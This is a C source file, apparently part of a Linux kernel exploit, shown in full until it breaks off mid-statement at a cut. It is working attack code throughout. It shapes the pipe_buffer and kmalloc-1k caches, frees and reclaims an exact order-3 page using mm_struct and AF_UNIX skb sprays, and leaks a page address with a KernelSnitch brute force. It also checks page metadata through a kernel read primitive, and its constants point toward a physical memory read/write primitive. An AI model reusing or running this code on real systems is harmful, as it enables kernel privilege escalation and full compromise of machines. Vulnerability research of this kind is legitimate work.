#include "common.h"

#if defined(APP_PHYS_P0_ORACLE) && APP_PHYS_P0_ORACLE
#include P0_FINGERPRINT_HEADER
#endif

#define PIPE_SHAPE_ROUNDS 0
#define PHYSRW_PROOF_OFF 0x7000
#define PHYS_READ_TAG "nebusec_70687973727730"
#define PHYS_WRITE_TAG "nebusec_70687973727731"
#define PHYS64_SEED 0x306365737562656eULL
#define PHYS64_NEXT 0x316365737562656eULL
#define PIPE_ORDER3_PROBE_MAX 512
#define PIPE_ORDER3_STREAM_LEN (ORDER3_SIZE - SKB_DATA_DELTA)
#define PIPE_ORDER3_MAGIC 0x335245444c4f4847ULL

static int pipe_objects_ready;
static int pipe_fds_n[PIPE_N_COUNT][2];
static int pipe_fds_c[PIPE_C_COUNT][2];
static int pipe_fds_e[PIPE_E_COUNT][2];
static int pipe_fds_drain[PIPE_DRAIN][2];
static int pipe_fds_reclaim[PIPE_RECLAIM][2];
#if defined(APP_PHYS_P0_ORACLE) && APP_PHYS_P0_ORACLE
static int p0_gate_holders[PIPE_RECLAIM][2];
static int p0_gate_holders_initialized;
#endif

static size_t pipe_read_result(int fd, void *data, size_t size,
                               int *error_out) {
  size_t total = 0;
  *error_out = 0;
  while (total < size) {
    ssize_t got = read(fd, (char *)data + total, size - total);
    if (got > 0) {
      total += (size_t)got;
      continue;
    }
    if (got == 0)
      break;
    if (errno == EINTR)
      continue;
    *error_out = errno;
    break;
  }
  return total;
}

pid_t pipe_prepare_child = -1;
uint64_t kmalloc_pipe_cache;
uint64_t kmalloc_normal_1k_cache;
uint64_t kmalloc_normal_2k_cache;
uint64_t kmalloc_cgroup_1k_cache;
uint64_t kmalloc_cgroup_2k_cache;
uint64_t candidate_slab_cache;
int pipe_cache_gate_ok;
int pipe_cache_page_index = -1;
int pipe_cache_slot_hit = -1;
uint64_t pipe_page_slab_cache[PIPE_CANDIDATE_PAGES];
uint32_t pipe_page_type[PIPE_CANDIDATE_PAGES];
uintptr_t pipebuf_page_base;
uintptr_t pipebuf_addr;
int pipebuf_pipe_idx = -1;
char physrw_readback[64];
char physrw_after_write[64];
int physrw_read_ok;
int physrw_write_ok;
int pipe_scan_vmemmap;
int pipe_scan_ops;
int pipe_scan_len;
int pipe_probe_found;
uint64_t pipe_probe_page;
uint64_t pipe_probe_ops;
uint64_t pipe_probe_private;
uint32_t pipe_probe_len;
uint32_t pipe_probe_flags;
uint64_t pipe_scan_first_page;
uint64_t pipe_scan_first_ops;
uint64_t pipe_scan_q0;
uint64_t pipe_scan_q1;
uint64_t pipe_scan_q2;
uint64_t pipe_scan_q3;
uint32_t pipe_scan_first_len;
uint32_t pipe_scan_first_flags;
uint64_t physrw_read64_before;
uint64_t physrw_read64_after;
uint64_t physrw_write64_value;
int physrw_read64_ok;
int physrw_write64_ok;

void init_ctx(struct mm_ctx *ctx, size_t cnt) {
  ctx->mm_cnt = cnt;
  ctx->childs = calloc(sizeof(pid_t), cnt);
  ctx->memfds = calloc(sizeof(int), cnt);
}

void resize_pipe_slots(int pipefd[2], size_t slots) {
  SYSCHK(fcntl(pipefd[0], F_SETPIPE_SZ, slots * PAGE_SIZE));
}

void make_pipe_object(int pipefd[2]) {
  SYSCHK(pipe(pipefd));
  resize_pipe_slots(pipefd, 2);
}

void alloc_pipe_object(int pipefd[2]) {
  resize_pipe_slots(pipefd, PIPE_BUFFER_SLOTS);
}

void free_pipe_object(int pipefd[2]) {
  resize_pipe_slots(pipefd, 2);
}

void shape_pipe_cache_once(void) {
  for (size_t i = 0; i < PIPE_N_COUNT; i++) {
    alloc_pipe_object(pipe_fds_n[i]);
  }
  for (size_t i = 0; i < PIPE_C_COUNT; i++) {
    alloc_pipe_object(pipe_fds_c[i]);
  }
  for (size_t i = 0; i < PIPE_E_COUNT; i++) {
    alloc_pipe_object(pipe_fds_e[i]);
  }
  for (size_t i = 0; i < PIPE_N_COUNT; i += PIPE_OBJS_PER_SLAB) {
    free_pipe_object(pipe_fds_n[i]);
  }
  for (size_t i = 0; i < PIPE_E_COUNT; i++) {
    free_pipe_object(pipe_fds_e[i]);
  }
  for (size_t i = 0; i < PIPE_C_COUNT; i += PIPE_OBJS_PER_SLAB) {
    free_pipe_object(pipe_fds_c[i]);
  }
}

void shape_pipe_cache(void) {
  for (int round = 0; round < PIPE_SHAPE_ROUNDS; round++) {
    for (size_t i = 0; i < PIPE_N_COUNT; i++) {
      free_pipe_object(pipe_fds_n[i]);
    }
    for (size_t i = 0; i < PIPE_C_COUNT; i++) {
      free_pipe_object(pipe_fds_c[i]);
    }
    for (size_t i = 0; i < PIPE_E_COUNT; i++) {
      free_pipe_object(pipe_fds_e[i]);
    }
    shape_pipe_cache_once();
  }
}

struct pipe_order3_probe {
  int sv[2];
  uint64_t magic;
};

struct pipe_order3_state {
  struct pipe_order3_probe *probes;
  unsigned char *payload;
};

static void pipe_reclaim_snapshot(
    const char *phase, uintptr_t base, size_t allocations);

static struct pipe_order3_state *pipe_prepare_order3_probes(void) {
  struct pipe_order3_state *state = calloc(1, sizeof(*state));
  if (!state)
    return NULL;
  state->probes = calloc(PIPE_ORDER3_PROBE_MAX + 1,
                         sizeof(*state->probes));
  state->payload = malloc(PIPE_ORDER3_STREAM_LEN);
  if (!state->probes || !state->payload) {
    free(state->payload);
    free(state->probes);
    free(state);
    return NULL;
  }

  for (size_t i = 0; i <= PIPE_ORDER3_PROBE_MAX; i++) {
    state->probes[i].sv[0] = -1;
    state->probes[i].sv[1] = -1;
    if (socketpair(AF_UNIX, SOCK_STREAM | SOCK_CLOEXEC, 0,
                   state->probes[i].sv) != 0) {
      pr_warning("pipe order-3 socket precreate stopped at %zu errno=%d\n",
                 i, errno);
      break;
    }
  }
  return state;
}

static int pipe_probe_sample(uintptr_t base, uint64_t magic, int probe,
                             int *read_failures) {
#if defined(RMG_DIAG_PIPE_ORACLE) && RMG_DIAG_PIPE_ORACLE
  uint64_t first[8] = {0};
  uint64_t last[8] = {0};
  errno = 0;
  ssize_t first_ret = kernel_read_data(-1, base, first, sizeof(first));
  int first_errno = errno;
  errno = 0;
  ssize_t last_ret = kernel_read_data(
      -1, base + ORDER3_SIZE - sizeof(last), last, sizeof(last));
  int last_errno = errno;
  int first_matches = 0;
  int last_matches = 0;
  if (first_ret != (ssize_t)sizeof(first))
    (*read_failures)++;
  if (last_ret != (ssize_t)sizeof(last))
    (*read_failures)++;
  for (size_t i = 0; i < sizeof(first) / sizeof(first[0]); i++) {
    first_matches += first[i] == magic;
    last_matches += last[i] == magic;
  }
  if (probe < 3 || (probe + 1) % 64 == 0 ||
      probe == PIPE_ORDER3_PROBE_MAX - 1) {
    pr_info("pipe order-3 sample probe=%d magic=%016llx "
            "read_first=%zd/%d read_last=%zd/%d "
            "first=%016llx,%016llx last=%016llx,%016llx "
            "matches=%d/8,%d/8\n",
            probe, (unsigned long long)magic,
            first_ret, first_errno, last_ret, last_errno,
            (unsigned long long)first[0],
            (unsigned long long)first[7],
            (unsigned long long)last[0],
            (unsigned long long)last[7], first_matches, last_matches);
  }
  return first_ret == (ssize_t)sizeof(first) &&
         last_ret == (ssize_t)sizeof(last) &&
         first_matches == 8 && last_matches == 8;
#else
  (void)probe;
  (void)read_failures;
  uint64_t first[8] = {0};
  uint64_t last[8] = {0};
  if (kernel_read_data(-1, base, first, sizeof(first)) !=
          (ssize_t)sizeof(first) ||
      kernel_read_data(-1, base + ORDER3_SIZE - sizeof(last),
                       last, sizeof(last)) != (ssize_t)sizeof(last))
    return 0;
  for (size_t i = 0; i < sizeof(first) / sizeof(first[0]); i++) {
    if (first[i] != magic || last[i] != magic)
      return 0;
  }
  return 1;
#endif
}

static int pipe_alloc_order3_probe(struct pipe_order3_state *state,
                                   int index, uint64_t magic) {
  struct pipe_order3_probe *probe = &state->probes[index];
  if (probe->sv[0] < 0 || probe->sv[1] < 0)
    return 0;
  probe->magic = magic;
  for (size_t off = 0; off + sizeof(magic) <= PIPE_ORDER3_STREAM_LEN;
       off += sizeof(magic))
    memcpy(state->payload + off, &magic, sizeof(magic));
  ssize_t sent = send(probe->sv[0], state->payload,
                      PIPE_ORDER3_STREAM_LEN, 0);
  return sent == PIPE_ORDER3_STREAM_LEN;
}

static int pipe_drain_order3_probe(struct pipe_order3_state *state,
                                   int index) {
  struct pipe_order3_probe *probe = &state->probes[index];
  size_t drained = 0;
  while (drained < PIPE_ORDER3_STREAM_LEN) {
    ssize_t got = recv(probe->sv[1], state->payload + drained,
                       PIPE_ORDER3_STREAM_LEN - drained, 0);
    if (got < 0 && errno == EINTR)
      continue;
    if (got <= 0)
      break;
    drained += (size_t)got;
  }
  return drained == PIPE_ORDER3_STREAM_LEN;
}

/* Drain order-3 buddy lists with one-fragment AF_UNIX stream skbs while the
 * configfs read primitive watches the exact released page. Socket objects are
 * created before release so only the skb head and one order-3 page are
 * allocated inside the critical window. Once a unique marker covers both
 * ends of the page, keep adjacent allocations alive, free only the capturing
 * skb, and let the next kmalloc-1k slab take the unmerged order-3 block. */
static int pipe_stage_exact_order3(uintptr_t base,
                                   struct pipe_order3_state *state) {
  int captured = -1;
  int allocated = 0;
  int read_failures = 0;
#if defined(RMG_DIAG_DURABLE_LOG) && RMG_DIAG_DURABLE_LOG
  rmg_diag_checkpoint("oracle-loop-start", base, PIPE_ORDER3_PROBE_MAX);
#endif
  for (int i = 0; i < PIPE_ORDER3_PROBE_MAX; i++) {
    uint64_t magic = PIPE_ORDER3_MAGIC ^ (uint64_t)(i + 1);
    if (!pipe_alloc_order3_probe(state, i, magic))
      break;
    allocated++;
    int matched = pipe_probe_sample(base, magic, i, &read_failures);
#if defined(RMG_DIAG_DURABLE_LOG) && RMG_DIAG_DURABLE_LOG
    if (i < 4 || (i + 1) % 64 == 0)
      rmg_diag_checkpoint(matched ? "oracle-hit" : "oracle-probe",
                          i + 1, read_failures);
#endif
    if (matched) {
      captured = i;
#if defined(RMG_DIAG_DURABLE_LOG) && RMG_DIAG_DURABLE_LOG
      rmg_diag_checkpoint("oracle-captured", i, read_failures);
#endif
      break;
    }
  }
  if (captured < 0) {
#if defined(RMG_DIAG_DURABLE_LOG) && RMG_DIAG_DURABLE_LOG
    rmg_diag_checkpoint("oracle-miss", allocated, read_failures);
#endif
#if defined(RMG_DIAG_PIPE_ORACLE) && RMG_DIAG_PIPE_ORACLE
    pr_warning("pipe order-3 oracle missed target after %d probes "
               "read_failures=%d\n", allocated, read_failures);
    pipe_reclaim_snapshot("oracle-miss", base, allocated);
#else
    pr_warning("pipe order-3 oracle missed target after %d probes\n",
               allocated);
#endif
    return 0;
  }

  /* One allocation after the hit holds the split buddy when the captured
   * target was the lower half. The previous allocation already holds it when
   * the target was the upper half. It also keeps the target skb's kmalloc-4k
   * head slab non-empty when that skb is freed. */
  int guard = captured + 1;
  if (guard <= PIPE_ORDER3_PROBE_MAX) {
    uint64_t magic = PIPE_ORDER3_MAGIC ^ (uint64_t)(guard + 1);
    if (pipe_alloc_order3_probe(state, guard, magic))
      allocated++;
  }

  /* Keep the drain arrays allocated while releasing the marked skb and
   * growing the reclaim population. This matches the successful standalone
   * reference ordering: the target order-3 page is freed while existing
   * kmalloc-1k slabs remain occupied, so reclaim growth can consume it. */
  int drained = pipe_drain_order3_probe(state, captured);
  close(state->probes[captured].sv[0]);
  close(state->probes[captured].sv[1]);
  state->probes[captured].sv[0] = -1;
  state->probes[captured].sv[1] = -1;
  pr_info("pipe order-3 oracle captured probe=%d allocated=%d guard=%d "
          "drain_arrays=%d drained=%d\n",
          captured, allocated,
          state->probes[guard].sv[0] >= 0 ? guard : -1,
          PIPE_DRAIN, drained);
  pipe_reclaim_snapshot(drained ? "skb-freed" : "skb-drain-incomplete",
                        base, 0);
  return drained;
}

static uintptr_t prepare_controlled_pipe_buffer_page_child(void) {
  int target_fds[ORDER3_SIZE / MM_STRUCT_SZ];
  uintptr_t base = 0;
  uintptr_t buddy_base = 0;
  int buddy_guard_fd = -1;
#if defined(RMG_DIAG_DURABLE_LOG) && RMG_DIAG_DURABLE_LOG
  rmg_diag_checkpoint("mmcollect-child-start", 0, 0);
#endif
  if (!collect_controlled_mm_slab_page(
          &base, target_fds, &buddy_guard_fd, &buddy_base)) {
#if defined(RMG_DIAG_DURABLE_LOG) && RMG_DIAG_DURABLE_LOG
    rmg_diag_checkpoint("mmcollect-child-failed", 0, 0);
#endif
    pr_error("controlled pipe mm group collection failed\n");
    return 0;
  }
#if defined(RMG_DIAG_DURABLE_LOG) && RMG_DIAG_DURABLE_LOG
  rmg_diag_checkpoint("mmcollect-child-done", base, buddy_base);
  rmg_diag_checkpoint("pipe-probes-start", base, buddy_guard_fd);
#endif
  pr_info("controlled pipe optional guard fd=%d buddy=%016zx\n",
          buddy_guard_fd, buddy_base);

  struct pipe_order3_state *order3_state = pipe_prepare_order3_probes();
  if (!order3_state) {
#if defined(RMG_DIAG_DURABLE_LOG) && RMG_DIAG_DURABLE_LOG
    rmg_diag_checkpoint("pipe-precreate-failed", 0, 0);
#endif
    pr_warning("pipe order-3 probe precreate failed\n");
    return 0;
  }
#if defined(RMG_DIAG_DURABLE_LOG) && RMG_DIAG_DURABLE_LOG
  rmg_diag_checkpoint("pipe-probes-done", base, 0);
  rmg_diag_checkpoint("pipe-drain-precreate-start", base, PIPE_DRAIN);
#endif

  /* Fill the kmalloc-1k cache with the drain population first. The exact
   * target stays pinned by its probe while those arrays are shrunk; draining
   * the probe then releases the target after the old slabs. */
  for (size_t i = 0; i < PIPE_DRAIN; i++)
    alloc_pipe_object(pipe_fds_drain[i]);
#if defined(RMG_DIAG_DURABLE_LOG) && RMG_DIAG_DURABLE_LOG
  rmg_diag_checkpoint("pipe-drain-precreate-done", base, PIPE_DRAIN);
#endif

  int anchor_fd = -1;
  unsigned long slabs_before = 0;
#if defined(RMG_DIAG_DURABLE_LOG) && RMG_DIAG_DURABLE_LOG
  rmg_diag_checkpoint("mm-release-start", base, PIPE_DRAIN);
#endif
  if (!release_controlled_mm_slab_page(
          target_fds, &anchor_fd, &slabs_before)) {
#if defined(RMG_DIAG_DURABLE_LOG) && RMG_DIAG_DURABLE_LOG
    rmg_diag_checkpoint("mm-release-failed", base, 0);
#endif
    return 0;
  }
#if defined(RMG_DIAG_DURABLE_LOG) && RMG_DIAG_DURABLE_LOG
  rmg_diag_checkpoint("mm-release-done", anchor_fd, slabs_before);
#endif

  if (!pipe_stage_exact_order3(base, order3_state)) {
#if defined(RMG_DIAG_DURABLE_LOG) && RMG_DIAG_DURABLE_LOG
    rmg_diag_checkpoint("oracle-stage-failed", base, 0);
#endif
    return 0;
  }
#if defined(RMG_DIAG_DURABLE_LOG) && RMG_DIAG_DURABLE_LOG
  rmg_diag_checkpoint("oracle-stage-done", base, 0);
  rmg_diag_checkpoint("pipe-reclaim-start", base, PIPE_RECLAIM);
#endif

  for (size_t i = 0; i < PIPE_RECLAIM; i++) {
    alloc_pipe_object(pipe_fds_reclaim[i]);
    size_t allocations = i + 1;
    int trace_batch = 0;
#if RMG_DIAG_PIPE_RECLAIM_TRACE
    trace_batch = allocations % PIPE_OBJS_PER_SLAB == 0;
#endif
    if (allocations == PIPE_DRAIN || allocations == PIPE_DRAIN + 1 ||
        allocations == PIPE_RECLAIM
#if defined(RMG_DIAG_PIPE_GROWTH) && RMG_DIAG_PIPE_GROWTH
        || allocations == 128 || allocations == 256 || allocations == 384 ||
        allocations == 512 || allocations == 640
#endif
        || trace_batch) {
      pipe_reclaim_snapshot("pipe-growth", base, allocations);
    }
#if defined(RMG_DIAG_DURABLE_LOG) && RMG_DIAG_DURABLE_LOG
    if (allocations % 128 == 0 || allocations == PIPE_RECLAIM)
      rmg_diag_checkpoint("pipe-reclaim-progress", allocations, base);
#endif
  }

  unsigned long slabs_after = controlled_mm_slab_count();
  pr_info("controlled pipe reclaim base=%016zx drain=%d reclaim=%d anchor=%d slabs=%lu->%lu\n",
          base, PIPE_DRAIN, PIPE_RECLAIM, anchor_fd,
          slabs_before, slabs_after);
  if (!slabs_after || slabs_after >= slabs_before) {
#if defined(RMG_DIAG_DURABLE_LOG) && RMG_DIAG_DURABLE_LOG
    rmg_diag_checkpoint("mm-slab-gate-reject", slabs_before, slabs_after);
#endif
    pr_warning("controlled pipe reclaim rejected: mm slab not discarded\n");
    return 0;
  }
#if defined(RMG_DIAG_DURABLE_LOG) && RMG_DIAG_DURABLE_LOG
  rmg_diag_checkpoint("mm-slab-gate-pass", slabs_before, slabs_after);
#endif

  /* A lower global mm-slab count does not prove that this exact order-3
   * allocation was reused by the pipe-object cache. Verify its page metadata
   * before handing the candidate back to the caller. The cache gate may set
   * pipebuf_page_base to the matching 4 KiB subpage; preserve the original
   * order-3 base for the later pipe_buffer scan. */
  uintptr_t order3_base = base;
  pipebuf_page_base = order3_base;
  int cache_reclaimed = pipe_reclaim_cache_gate(-1);
  uintptr_t cache_page = pipebuf_page_base;
  pipebuf_page_base = order3_base;
#if defined(RMG_DIAG_DURABLE_LOG) && RMG_DIAG_DURABLE_LOG
  rmg_diag_checkpoint(cache_reclaimed ? "pipe-cache-gate-match" :
                                           "pipe-cache-gate-miss",
                      (unsigned long long)pipe_cache_page_index,
                      (unsigned long long)cache_page);
#endif
  if (!cache_reclaimed ||
      (cache_page & ~(ORDER3_SIZE - 1)) != order3_base) {
    pr_warning("controlled pipe reclaim rejected: target page is not in "
               "the expected pipe cache cache_match=%d page_index=%d "
               "matched_page=%016zx order3_base=%016zx\n",
               cache_reclaimed, pipe_cache_page_index,
               cache_page, order3_base);
    return 0;
  }
  pr_info("controlled pipe reclaim verified target page=%016zx "
          "page_index=%d cache=%016llx\n",
          cache_page, pipe_cache_page_index,
          (unsigned long long)candidate_slab_cache);
  return base;
}

uintptr_t prepare_pipe_buffer_page_child(void) {
  if (getenv("CONTROLLED_RECLAIM"))
    return prepare_controlled_pipe_buffer_page_child();
  struct mm_ctx prep;
  struct mm_ctx spray;
  struct mm_ctx pre;
  struct mm_ctx post;
  size_t objs_per_slab = ORDER3_SIZE / MM_STRUCT_SZ;

  init_ctx(&prep, 32 * objs_per_slab);
  init_ctx(&spray, (1 + MM_PARTIALS) * objs_per_slab);
  init_ctx(&pre, objs_per_slab - 1);
  init_ctx(&post, objs_per_slab);

  for (size_t i = 0; i < prep.mm_cnt; i++) {
    prep.childs[i] = -1;
    prep.memfds[i] = clone_memfd();
  }
  for (size_t i = 0; i < spray.mm_cnt; i++) {
    spray.childs[i] = -1;
    spray.memfds[i] = clone_memfd();
  }

  setup_kernelsnitch();

  for (size_t i = 0; i < pre.mm_cnt; i++) {
    pre.childs[i] = -1;
    pre.memfds[i] = clone_memfd();
  }
  pid_t leak_child = clone_leak_child();
  for (size_t i = 0; i < post.mm_cnt; i++) {
    post.childs[i] = -1;
    post.memfds[i] = clone_memfd();
  }
  int leak_memfd = open_memfd(leak_child);

  for (size_t i = 0; i < pre.mm_cnt; i++) {
    kill_child(pre.childs[i]);
  }
  for (size_t i = 0; i < post.mm_cnt; i++) {
    kill_child(post.childs[i]);
  }
  for (size_t i = 0; i < spray.mm_cnt; i++) {
    kill_child(spray.childs[i]);
  }
  SYSCHK(waitpid(leak_child, NULL, 0));

  if (!kernelsnitch_collisions_ready()) {
    pr_error("pipe KernelSnitch collision finding failed\n");
  }

  unsigned char *buf = malloc(SKB_SEND_SIZE);
  memset(buf, 0x50, SKB_SEND_SIZE);

  int skb_sv[2];
  int pcp_sv[2];
  SYSCHK(socketpair(AF_UNIX, SOCK_STREAM, 0, skb_sv));
  SYSCHK(socketpair(AF_UNIX, SOCK_STREAM, 0, pcp_sv));

  struct iovec iov;
  memset(&iov, 0, sizeof(iov));
  iov.iov_base = buf;
  iov.iov_len = SKB_SEND_SIZE;

  struct msghdr msg;
  memset(&msg, 0, sizeof(msg));
  msg.msg_iov = &iov;
  msg.msg_iovlen = 1;

  SYSCHK(sendmsg(pcp_sv[0], &msg, 0));
  pin_to_core(CORE);

  sched_yield();
  sched_yield();
  sched_yield();
  sched_yield();
  for (size_t i = 0; i < pre.mm_cnt; i++) {
    SYSCHK(close(pre.memfds[i]));
    pre.memfds[i] = -1;
  }
  for (size_t i = 0; i < post.mm_cnt - 1; i++) {
    SYSCHK(close(post.memfds[i]));
    post.memfds[i] = -1;
  }
  for (size_t i = 0; i < spray.mm_cnt; i += objs_per_slab) {
    SYSCHK(close(spray.memfds[i]));
    spray.memfds[i] = -1;
  }
  SYSCHK(close(pcp_sv[0]));
  SYSCHK(close(pcp_sv[1]));

  sched_yield();
  sched_yield();
  sched_yield();
  sched_yield();
  SYSCHK(close(leak_memfd));
  SYSCHK(sendmsg(skb_sv[0], &msg, 0));

  run_kernelsnitch_bruteforce();
  uintptr_t leaked = cleanup_kernelsnitch();
  if (leaked == (uintptr_t)-1) {
    pr_error("pipe KernelSnitch sk_buff page leak failed\n");
  }
  uintptr_t base = leaked & ~(ORDER3_SIZE - 1);

  shape_pipe_cache();

  for (size_t i = 0; i < PIPE_DRAIN; i++) {
    alloc_pipe_object(pipe_fds_drain[i]);
  }

  pin_to_core(CORE);
  SYSCHK(close(skb_sv[0]));
  SYSCHK(close(skb_sv[1]));
  for (size_t i = 0; i < PIPE_RECLAIM; i++) {
    alloc_pipe_object(pipe_fds_reclaim[i]);
  }

  close_ctx_memfds(&prep);
  close_ctx_memfds(&spray);
  close_ctx_memfds(&pre);
  close_ctx_memfds(&post);
  free_ctx_storage(&prep);
  free_ctx_storage(&spray);
  free_ctx_storage(&pre);
  free_ctx_storage(&post);
  free(buf);
  return base;
}

uintptr_t prepare_pipe_buffer_page(void) {
#if defined(RMG_DIAG_DURABLE_LOG) && RMG_DIAG_DURABLE_LOG
  rmg_diag_checkpoint("pipe-page-prepare-start", 0, 0);
#endif
  if (PIPE_SHAPE_ROUNDS != 0) {
    for (size_t i = 0; i < PIPE_N_COUNT; i++) {
      make_pipe_object(pipe_fds_n[i]);
    }
    for (size_t i = 0; i < PIPE_C_COUNT; i++) {
      make_pipe_object(pipe_fds_c[i]);
    }
    for (size_t i = 0; i < PIPE_E_COUNT; i++) {
      make_pipe_object(pipe_fds_e[i]);
    }
  }
  for (size_t i = 0; i < PIPE_DRAIN; i++) {
    make_pipe_object(pipe_fds_drain[i]);
  }
  for (size_t i = 0; i < PIPE_RECLAIM; i++) {
    make_pipe_object(pipe_fds_reclaim[i]);
  }
  pipe_objects_ready = 1;

  int result_pipe[2];
  SYSCHK(pipe(result_pipe));
  pid_t child = SYSCHK(fork());
  if (child == 0) {
    SYSCHK(prctl(PR_SET_PDEATHSIG, SIGKILL));
    if (getppid() == 1) {
      _exit(1);
    }
    SYSCHK(close(result_pipe[0]));
#if defined(RMG_DIAG_DURABLE_LOG) && RMG_DIAG_DURABLE_LOG
    rmg_diag_checkpoint("pipe-page-child-start", getpid(),
                        getenv("CONTROLLED_RECLAIM") != NULL);
#endif
    uintptr_t base = prepare_pipe_buffer_page_child();
#if defined(RMG_DIAG_DURABLE_LOG) && RMG_DIAG_DURABLE_LOG
    rmg_diag_checkpoint("pipe-page-child-pre-handoff", base, getpid());
#endif
    pr_info("pipe page child result pid=%d base=%016zx\n", getpid(), base);
    for (size_t i = 0; i < PIPE_DRAIN; i++) {
      close(pipe_fds_drain[i][0]);
      close(pipe_fds_drain[i][1]);
      pipe_fds_drain[i][0] = -1;
      pipe_fds_drain[i][1] = -1;
    }
    ssize_t sent = write(result_pipe[1], &base, sizeof(base));
    int write_errno = errno;
    pr_info("pipe page child handoff pid=%d write=%zd expected=%zu errno=%d\n",
            getpid(), sent, sizeof(base), sent < 0 ? write_errno : 0);
    if (sent != (ssize_t)sizeof(base))
      _exit(2);
    for (;;) {
      sleep(60);
    }
  }

  pipe_prepare_child = child;
  SYSCHK(close(result_pipe[1]));
  uintptr_t base = 0;
  int read_errno = 0;
  size_t got = pipe_read_result(
      result_pipe[0], &base, sizeof(base), &read_errno);
  SYSCHK(close(result_pipe[0]));
  if (got != sizeof(base)) {
    int status = 0;
    pid_t waited = waitpid(child, &status, WNOHANG);
    pr_error("pipe page child handoff incomplete pid=%d got=%zu expected=%zu "
             "errno=%d wait=%d status=%d\n",
             child, got, sizeof(base), read_errno, waited, status);
    if (waited == 0) {
      kill(child, SIGKILL);
      while (waitpid(child, &status, 0) < 0 && errno == EINTR) {}
      pr_warning("pipe page child stopped after incomplete handoff pid=%d "
                 "status=%d\n", child, status);
    }
    pipe_prepare_child = -1;
    return 0;
  }
#if defined(RMG_DIAG_DURABLE_LOG) && RMG_DIAG_DURABLE_LOG
  rmg_diag_checkpoint("pipe-page-parent-handoff", base, child);
#endif
  if (!base) {
    pr_error("pipe page child reported a null base pid=%d\n", child);
  }
#if defined(RMG_DIAG_DURABLE_LOG) && RMG_DIAG_DURABLE_LOG
  rmg_diag_checkpoint("pipe-parent-drain-close-start", PIPE_DRAIN, child);
#endif
  for (size_t i = 0; i < PIPE_DRAIN; i++) {
    close(pipe_fds_drain[i][0]);
    close(pipe_fds_drain[i][1]);
    pipe_fds_drain[i][0] = -1;
    pipe_fds_drain[i][1] = -1;
#if defined(RMG_DIAG_DURABLE_LOG) && RMG_DIAG_DURABLE_LOG
    if ((i + 1) % 16 == 0 || i + 1 == PIPE_DRAIN) {
      rmg_diag_checkpoint("pipe-parent-drain-close-progress", i + 1,
                          child);
    }
#endif
  }
#if defined(RMG_DIAG_DURABLE_LOG) && RMG_DIAG_DURABLE_LOG
  rmg_diag_checkpoint("pipe-parent-drain-close-done", PIPE_DRAIN, child);
#endif
  return base;
}

void reset_pipe_attempt(void) {
  if (pipe_prepare_child > 0) {
    kill(pipe_prepare_child, SIGKILL);
    waitpid(pipe_prepare_child, NULL, 0);
    pipe_prepare_child = -1;
  }

  if (pipe_objects_ready) {
    for (size_t i = 0; i < PIPE_DRAIN; i++) {
      close(pipe_fds_drain[i][0]);
      close(pipe_fds_drain[i][1]);
    }
    for (size_t i = 0; i < PIPE_RECLAIM; i++) {
      close(pipe_fds_reclaim[i][0]);
      close(pipe_fds_reclaim[i][1]);
    }
    pipe_objects_ready = 0;
  }

#if defined(APP_PHYS_P0_ORACLE) && APP_PHYS_P0_ORACLE
  if (p0_gate_holders_initialized) {
    for (size_t i = 0; i < PIPE_RECLAIM; i++) {
      if (p0_gate_holders[i][0] >= 0) {
        close(p0_gate_holders[i][0]);
      }
      if (p0_gate_holders[i][1] >= 0) {
        close(p0_gate_holders[i][1]);
      }
      p0_gate_holders[i][0] = -1;
      p0_gate_holders[i][1] = -1;
    }
    p0_gate_holders_initialized = 0;
  }
#endif

  pipebuf_page_base = 0;
  pipebuf_addr = 0;
  pipebuf_pipe_idx = -1;
  pipe_cache_gate_ok = 0;
  pipe_cache_page_index = -1;
  pipe_cache_slot_hit = -1;
  pipe_probe_found = 0;
  pipe_probe_page = 0;
  pipe_probe_ops = 0;
  pipe_probe_private = 0;
  pipe_probe_len = 0;
  pipe_probe_flags = 0;
  candidate_slab_cache = 0;
  atomic_store(&pipe_prepare_request, 0);
  atomic_store(&pipe_prepare_done, 0);
}

uintptr_t direct_to_page(uintptr_t addr) {
  uintptr_t pfn = (addr - DIRECT_MAP_BASE) >> PAGE_SHIFT;
  return VMEMMAP_START + pfn * STRUCT_PAGE_SIZE;
}

uintptr_t direct_to_head_page(int fd, uintptr_t addr) {
  uintptr_t page = direct_to_page(addr);
  uintptr_t head_addr = page + STRUCT_PAGE_COMPOUND_HEAD_OFF;
  uint64_t compound_head = kernel_read64(fd, head_addr);
  if (compound_head & 1) {
    return compound_head & ~1ULL;
  }
  return page;
}

uintptr_t page_to_direct(uintptr_t page) {
  uintptr_t pfn = (page - VMEMMAP_START) / STRUCT_PAGE_SIZE;
  return DIRECT_MAP_BASE + (pfn << PAGE_SHIFT);
}

static void pipe_reclaim_snapshot(
    const char *phase, uintptr_t base, size_t allocations) {
#if !defined(RMG_DIAG_PAGE_IDENTITY) || !RMG_DIAG_PAGE_IDENTITY
  uintptr_t seen[ORDER3_SIZE / PAGE_SIZE];
  size_t seen_count = 0;
#endif
  for (size_t off = 0; off < ORDER3_SIZE; off += PAGE_SIZE) {
    uintptr_t page = base + off;
    uintptr_t head = direct_to_head_page(-1, page);
#if defined(RMG_DIAG_PAGE_IDENTITY) && RMG_DIAG_PAGE_IDENTITY
    uintptr_t page_meta = direct_to_page(page);
    uint64_t page_word08 = 0;
    errno = 0;
    ssize_t word08_ret = kernel_read_data(
        -1, page_meta + STRUCT_PAGE_COMPOUND_HEAD_OFF,
        &page_word08, sizeof(page_word08));
    int word08_errno = errno;
    if (word08_ret == (ssize_t)sizeof(page_word08))
      head = (page_word08 & 1) ? page_word08 & ~1ULL : page_meta;
#endif
    int duplicate = 0;
#if !defined(RMG_DIAG_PAGE_IDENTITY) || !RMG_DIAG_PAGE_IDENTITY
    for (size_t i = 0; i < seen_count; i++) {
      if (seen[i] == head) {
        duplicate = 1;
        break;
      }
    }
    if (duplicate)
      continue;
    seen[seen_count++] = head;
#else
    (void)duplicate;
#endif

    uint64_t slab_cache = 0;
    uint64_t page_type = 0;
    errno = 0;
    ssize_t cache_ret = kernel_read_data(
        -1, head + STRUCT_SLAB_CACHE_OFF, &slab_cache, sizeof(slab_cache));
    int cache_errno = errno;
    errno = 0;
    ssize_t type_ret = kernel_read_data(
        -1, head + STRUCT_PAGE_TYPE_OFF, &page_type, sizeof(page_type));
    int type_errno = errno;
#if defined(RMG_DIAG_PAGE_IDENTITY) && RMG_DIAG_PAGE_IDENTITY
    uintptr_t pfn = (page - DIRECT_MAP_BASE) >> PAGE_SHIFT;
    pr_info("pipe reclaim snapshot phase=%s alloc=%zu page_off=%#zx "
            "page=%016zx pfn=%016zx meta=%016zx word08=%zd/%d:%016llx "
